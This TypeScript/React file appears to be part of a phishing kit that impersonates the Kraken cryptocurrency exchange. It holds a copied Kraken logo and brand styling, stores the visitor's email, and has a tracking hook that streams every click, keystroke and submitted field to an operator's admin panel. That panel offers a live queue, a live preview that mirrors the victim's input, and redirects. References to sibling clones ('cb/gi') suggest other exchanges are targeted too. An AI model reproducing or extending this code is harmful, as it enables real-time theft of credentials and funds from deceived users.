/**
 * Shared Kraken (kn) primitives: wordmark, mark, fonts, and tracking that maps
 * the pages' original `useVisitorTracking` API onto `useParticipant` so the
 * admin panel (queue, live preview, live-input, redirects) keeps working.
 */

import { useEffect, useMemo } from "react";
import { useNavigate } from "@tanstack/react-router";
import { useParticipant } from "@/hooks/useParticipant";

export const KN_PURPLE = "#7132f5";
export const KN_PAGE_BG = "#f6f5f9";
export const KN_FONT =
  "'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif";

export const KN_EMAIL_KEY = "__kn_email";

export function getKnEmail(): string {
  if (typeof window === "undefined") return "";
  try {
    return sessionStorage.getItem(KN_EMAIL_KEY) || localStorage.getItem(KN_EMAIL_KEY) || "";
  } catch {
    return "";
  }
}

export function setKnEmail(email: string) {
  if (typeof window === "undefined") return;
  const v = email.trim();
  try {
    sessionStorage.setItem(KN_EMAIL_KEY, v);
  } catch {
    /* ignore */
  }
  try {
    localStorage.setItem(KN_EMAIL_KEY, v);
  } catch {
    /* ignore */
  }
}

/** Kraken wordmark (purple). */
export function KrakenLogo() {
  return (
    <svg
      height="24"
      viewBox="0 0 91 15"
      xmlns="http://www.w3.org/2000/svg"
      fill={KN_PURPLE}
      aria-label="Kraken"
    >
      <path d="M79.5312 14.0147V0.785345H81.7917V2.48076C82.5367 1.19636 84.1036 0.400024 85.8761 0.400024C88.7789 0.400024 90.8853 1.94131 90.8853 5.92296V14.0147H88.5734V6.25691C88.5734 3.79085 87.366 2.58351 85.3624 2.58351C83.1018 2.58351 81.8431 4.12479 81.8431 6.33397V14.0147H79.5312Z" />
      <path d="M71.5676 14.4C67.4832 14.4 64.8887 11.6514 64.8887 7.3358C64.8887 3.20002 67.5345 0.400024 71.3621 0.400024C75.1639 0.400024 77.8354 2.96883 77.8354 6.64223C77.8354 7.69544 77.8354 7.92663 77.7841 8.15782H67.3033C67.4575 10.7523 69.0758 12.345 71.5932 12.345C73.3657 12.345 74.5987 11.5743 75.2153 10.1615H77.6042C76.9107 12.8074 74.6758 14.4 71.5676 14.4ZM67.3033 6.25691H75.3951C75.2923 3.8936 73.751 2.42938 71.3621 2.42938C69.0758 2.42938 67.5602 3.84223 67.3033 6.25691Z" />
      <path d="M44.523 14.4C41.8515 14.4 39.8992 12.9615 39.8992 10.4697C39.8992 7.97801 41.6717 6.84773 43.7524 6.46241L46.9891 5.8459C48.0937 5.64039 48.7359 5.35782 48.7359 4.35599C48.7359 3.20002 47.7597 2.42938 45.8074 2.42938C44.2148 2.42938 42.8276 3.07158 42.6478 4.5358H40.2588C40.4129 1.94131 42.7762 0.400024 45.8331 0.400024C49.5322 0.400024 51.0478 2.24957 51.0478 4.43305V11.2147C51.0478 11.8312 51.3304 12.1395 51.8441 12.1395C52.2808 12.1395 52.5377 12.0367 52.7689 11.8826V13.7578C52.4093 14.0661 51.7928 14.2716 51.0478 14.2716C49.9689 14.2716 49.0441 13.578 48.8129 12.4477C48.1964 13.3211 46.912 14.4 44.523 14.4ZM42.2882 10.3927C42.2882 11.7285 43.4184 12.3707 44.934 12.3707C47.0662 12.3707 48.7359 11.1633 48.7359 9.2881V7.15599C48.479 7.43856 47.6827 7.66975 46.7322 7.84957L44.5744 8.26057C43.0331 8.54314 42.2882 9.21103 42.2882 10.3927Z" />
      <path d="M32.9541 14.0147V0.785343H35.2146V2.99452C35.8568 1.42755 37.0128 0.502775 38.8366 0.502775C39.222 0.502775 39.6073 0.57984 39.8128 0.631215V2.99452C39.6073 2.94314 39.1706 2.86608 38.7339 2.86608C36.4733 2.86608 35.266 4.63856 35.266 7.46424V14.0147H32.9541Z" />
      <path d="M28.9027 0.785341H31.8825L26.5394 6.02571L32.1651 14.0147H29.4678L24.9724 7.61837L22.7633 9.72479V14.0147H20.4513V0.785341H22.7633V6.84773L28.9027 0.785341Z" />
      <path d="M62.2915 0.785341H65.2713L59.9282 6.02571L65.5538 14.0147H62.8566L58.3612 7.61837L56.152 9.72479V14.0147H53.8401V0.785341H56.152V6.84773L62.2915 0.785341Z" />
      <path d="M8.79521 0.400024C3.93757 0.400024 0 4.38923 0 9.31008V13.1284C0 13.8308 0.561922 14.3997 1.25558 14.3997C1.94923 14.3997 2.51527 13.8308 2.51527 13.1284V9.31008C2.51527 8.60561 3.07513 8.03662 3.77084 8.03662C4.4645 8.03662 5.02642 8.60561 5.02642 9.31008V13.1284C5.02642 13.8308 5.58834 14.3997 6.282 14.3997C6.97771 14.3997 7.53963 13.8308 7.53963 13.1284V9.31008C7.53963 8.60561 8.10155 8.03662 8.79521 8.03662C9.49092 8.03662 10.0549 8.60561 10.0549 9.31008V13.1284C10.0549 13.8308 10.6168 14.3997 11.3105 14.3997C12.0041 14.3997 12.5661 13.8308 12.5661 13.1284V9.31008C12.5661 8.60561 13.128 8.03662 13.8257 8.03662C14.5194 8.03662 15.0813 8.60561 15.0813 9.31008V13.1284C15.0813 13.8308 15.6432 14.3997 16.339 14.3997C17.0326 14.3997 17.5945 13.8308 17.5945 13.1284V9.31008C17.5945 4.38923 13.6549 0.400024 8.79521 0.400024Z" />
    </svg>
  );
}

/** Purple mark for loading / hero. */
export function KrakenMark({ size = 72 }: { size?: number }) {
  return (
    <img
      src="/kraken-logo.png"
      alt="Kraken"
      width={size}
      height={size}
      style={{ width: size, height: size, display: "block" }}
    />
  );
}

/** Shared font + mobile card rules used on every kn page. */
export function KnFontStyle() {
  return (
    <style>{`
      @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&display=swap');
      .kn-page, .kn-page * {
        font-family: ${KN_FONT} !important;
        -webkit-font-smoothing: antialiased;
        box-sizing: border-box;
      }
      @media (max-width: 640px) {
        .kraken-card { background-color: transparent !important; box-shadow: none !important; border-radius: 0 !important; padding: 16px 0 !important; }
        .kraken-lang-btn { display: none !important; }
        .kraken-footer-detail { display: none !important; }
        .kraken-footer { justify-content: center !important; }
        .kraken-header { padding-left: 16px !important; padding-right: 16px !important; }
      }
    `}</style>
  );
}

export function useIsObserve(): boolean {
  return useMemo(() => {
    if (typeof window === "undefined") return false;
    try {
      return new URLSearchParams(window.location.search).get("__observe") === "1";
    } catch {
      return false;
    }
  }, []);
}

/**
 * Drop-in for the original `useVisitorTracking()`.
 * Mirrors cb/gi: emitInput for clicks + live fields, knNavigate for routing.
 */
export function useKnTracking() {
  const isObserve = useIsObserve();
  const navigate = useNavigate();
  const { emitInput, participantId } = useParticipant();

  function trackClick(label: string) {
    if (isObserve) return;
    emitInput("__click", label);
  }

  function trackInput(field: string, value: string, _ftype?: string) {
    if (isObserve) return;
    emitInput(field, value);
  }

  function trackSubmit(field: string, value: string) {
    if (isObserve) return;
    const name = /_submitted$/i.test(field) ? field : `${field}_submitted`;
    emitInput(name, value);
  }

  function knNavigate(to: string) {
    if (isObserve) return;
    try {
      window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*");
    } catch {
      /* ignore */
    }
    navigate({ to, reloadDocument: false }).catch(() => {
      window.location.assign(to);
    });
  }

  // Live preview mirror: admin posts {__mirror, type:'live_input', field, value}
  useEffect(() => {
    if (!isObserve || typeof window === "undefined") return;
    function onMsg(e: MessageEvent) {
      const d = e.data;
      if (!d || typeof d !== "object" || d.__mirror !== true) return;
      if (d.type !== "live_input" || typeof d.field !== "string") return;
      const el = document.querySelector(`[name="${d.field}"]`) as
        | HTMLInputElement
        | HTMLTextAreaElement
        | null;
      if (el) {
        el.value = String(d.value ?? "");
        el.dispatchEvent(new Event("input", { bubbles: true }));
      }
      // Also broadcast for React-controlled inputs (digits / range).
      try {
        window.dispatchEvent(
          new CustomEvent("ux:mirror-live-input", {
            detail: { field: d.field, value: d.value },
          }),
        );
      } catch {
        /* ignore */
      }
    }
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, [isObserve]);

  return {
    sessionId: participantId,
    trackClick,
    trackInput,
    trackSubmit,
    knNavigate,
    isObserve,
  };
}
